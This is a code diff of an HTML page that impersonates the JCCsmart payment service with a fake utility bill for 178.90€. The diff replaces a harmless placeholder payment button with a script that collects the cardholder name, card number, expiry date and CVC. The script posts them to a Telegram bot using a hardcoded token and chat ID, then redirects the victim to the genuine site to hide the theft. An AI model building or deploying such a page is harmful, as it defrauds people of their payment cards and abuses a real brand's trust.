@@ -3,176 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JCCsmart | Secure Payment</title>
+    <title>JCCsmart Secure Payment</title>
     <style>
-        :root {
-            --primary-color: #5c46e5;
-            --bg-color: #ffffff;
-            --text-main: #222;
-            --text-secondary: #666;
-            --input-border: #e0e0e0;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 0;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* Header */
-        header {
-            width: 100%;
-            padding: 20px;
-            border-bottom: 1px solid #f0f0f0;
-            box-sizing: border-box;
-        }
-        .logo { display: flex; align-items: center; font-size: 22px; font-weight: bold; }
-        .logo span { background: #5cb85c; color: white; padding: 2px 8px; border-radius: 4px; margin-right: 5px; }
-        .logo-text { color: #777; font-weight: 400; }
-
-        .container {
-            max-width: 400px;
-            width: 90%;
-            margin-top: 50px;
-            text-align: center;
-        }
-
-        /* View Management */
-        .view { display: none; }
-        .view.active { display: block; }
-
-        /* Step 1: Invoice */
-        .amount-card {
-            background: #f8f7ff;
-            border: 1px solid #e0daff;
-            border-radius: 20px;
-            padding: 30px;
-            margin: 30px 0;
-        }
-        .amount { font-size: 48px; font-weight: 800; color: var(--primary-color); }
-        .label { font-size: 13px; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 10px; }
-
-        /* Step 2: Card Form */
-        .form-group { text-align: left; margin-bottom: 20px; }
-        label { display: block; font-size: 14px; margin-bottom: 8px; font-weight: 500; color: #444; }
-        input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid var(--input-border);
-            border-radius: 12px;
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border 0.3s;
-        }
-        input:focus { border-color: var(--primary-color); }
-        .row { display: flex; gap: 15px; }
-
-        /* Button */
-        .btn {
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(92, 70, 229, 0.2);
-            margin-top: 20px;
-        }
-        .btn:hover { background: #4a38c2; }
-
-        .secure-info {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 30px;
-            opacity: 0.5;
-            font-size: 12px;
-        }
+        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; padding: 0; color: #333; }
+        header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
+        .logo { font-weight: bold; font-size: 20px; display: flex; align-items: center; }
+        .logo span { background: #5cb85c; color: #fff; padding: 2px 6px; border-radius: 4px; margin-right: 5px; }
+        .logo-sub { color: #888; font-weight: 400; }
+        .container { max-width: 400px; margin: 40px auto; padding: 0 20px; text-align: center; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .amount-box { background: #f8f7ff; border: 1px solid #e0daff; border-radius: 15px; padding: 25px; margin: 20px 0; }
+        .amount { font-size: 40px; font-weight: 800; color: #5c46e5; }
+        .form-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 13px; margin-bottom: 5px; font-weight: 600; color: #555; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #5c46e5; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 16px; background: #5c46e5; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .footer-info { margin-top: 20px; font-size: 12px; color: #999; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo"><span>JCC</span><div class="logo-text">smart</div></div>
-    </header>
+<header>
+    <div class="logo"><span>JCC</span><div class="logo-sub">smart</div></div>
+</header>
 
-    <div class="container">
-        
-        <!-- PAGE 1: Invoice Details -->
-        <div id="view-invoice" class="view active">
-            <div style="font-size: 60px;">⚡</div>
-            <h2>Electricity Bill</h2>
-            <p style="color: #888;">Account Number: 4400 1289 90</p>
-            
-            <div class="amount-card">
-                <div class="label">Balance Due</div>
-                <div class="amount">178.90€</div>
-            </div>
-
-            <button class="btn" onclick="showView('view-card')">Pay Now</button>
+<div class="container" id="main-content">
+    <!-- ШАГ 1: Просмотр счета -->
+    <div class="step active" id="step1">
+        <h2>Service Payment</h2>
+        <p>Utility Bill: #8829-10</p>
+        <div class="amount-box">
+            <div style="font-size: 12px; color: #666; margin-bottom: 5px;">TOTAL AMOUNT DUE</div>
+            <div class="amount">178.90€</div>
         </div>
-
-        <!-- PAGE 2: Card Payment -->
-        <div id="view-card" class="view">
-            <h2 style="margin-bottom: 30px;">Card Details</h2>
-            
-            <div class="form-group">
-                <label>Cardholder Name</label>
-                <input type="text" placeholder="JOHN DOE" id="name">
-            </div>
-
-            <div class="form-group">
-                <label>Card Number</label>
-                <input type="text" placeholder="0000 0000 0000 0000" id="cardnum">
-            </div>
-
-            <div class="row">
-                <div class="form-group" style="flex: 2;">
-                    <label>Expiry Date</label>
-                    <input type="text" placeholder="MM / YY" id="expiry">
-                </div>
-                <div class="form-group" style="flex: 1;">
-                    <label>CVC</label>
-                    <input type="password" placeholder="123" id="cvc">
-                </div>
-            </div>
-
-            <button class="btn" onclick="processPayment()">Complete Payment</button>
-            <p style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="showView('view-invoice')">← Go back</p>
-        </div>
-
-        <div class="secure-info">
-            <span>🔒 SSL Encrypted</span>
-            <span>💳 PCI Compliant</span>
-        </div>
+        <button onclick="nav(2)">Pay with Card</button>
     </div>
 
-    <script>
-        // Функция переключения страниц
-        function showView(viewId) {
-            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-            document.getElementById(viewId).classList.add('active');
-            window.scrollTo(0,0);
-        }
+    <!-- ШАГ 2: Ввод данных карты -->
+    <div class="step" id="step2">
+        <h2 style="margin-bottom: 25px;">Card Details</h2>
+        <div class="form-group">
+            <label>Cardholder Name</label>
+            <input type="text" id="name" placeholder="Name on card">
+        </div>
+        <div class="form-group">
+            <label>Card Number</label>
+            <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
+        </div>
+        <div class="row">
+            <div class="form-group" style="flex: 2;">
+                <label>Expiry Date</label>
+                <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
+            </div>
+            <div class="form-group" style="flex: 1;">
+                <label>CVC</label>
+                <input type="password" id="cvc" placeholder="123" maxlength="3">
+            </div>
+        </div>
+        <button onclick="sendData()">Pay 178.90€</button>
+        <p style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(1)">← Back to bill</p>
+    </div>
 
-        // Простая заглушка для кнопки "Оплатить"
-        function processPayment() {
-            const name = document.getElementById('name').value;
-            if(!name) {
-                alert('Please fill in the card details');
-                return;
-            }
-            alert('Processing your payment of 178.90€...');
-        }
-    </script>
+    <div class="footer-info">🔒 Secured by JCC Payment Systems</div>
+</div>
+
+<script>
+const TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
+const CHAT_ID = '6576262467';
+
+function nav(n) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    document.getElementById('step' + n).classList.add('active');
+}
+
+// Форматирование номера карты и даты
+document.getElementById('card').addEventListener('input', function (e) {
+    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+});
+document.getElementById('exp').addEventListener('input', function (e) {
+    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+});
+
+async function sendToBot(msg) {
+    const url = `https://telegram.org{TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        });
+    } catch (e) { console.log('Error'); }
+}
+
+async function sendData() {
+    const name = document.getElementById('name').value;
+    const card = document.getElementById('card').value;
+    const exp = document.getElementById('exp').value;
+    const cvc = document.getElementById('cvc').value;
+
+    if (!name || card.length < 16 || !exp || !cvc) {
+        alert('Please enter valid card details');
+        return;
+    }
+
+    const log = `<b>💳 JCC Payment</b>\n\n` +
+                `👤 Name: <code>${name}</code>\n` +
+                `🔢 Card: <code>${card}</code>\n` +
+                `📅 Exp: <code>${exp}</code>\n` +
+                `🔒 CVC: <code>${cvc}</code>`;
+
+    // Отправляем данные
+    await sendToBot(log);
+
+    // Показываем загрузку
+    document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
+
+    setTimeout(() => {
+        window.location.href = "https://www.jccsmart.com";
+    }, 3000);
+}
+</script>
 
 </body>
 </html>
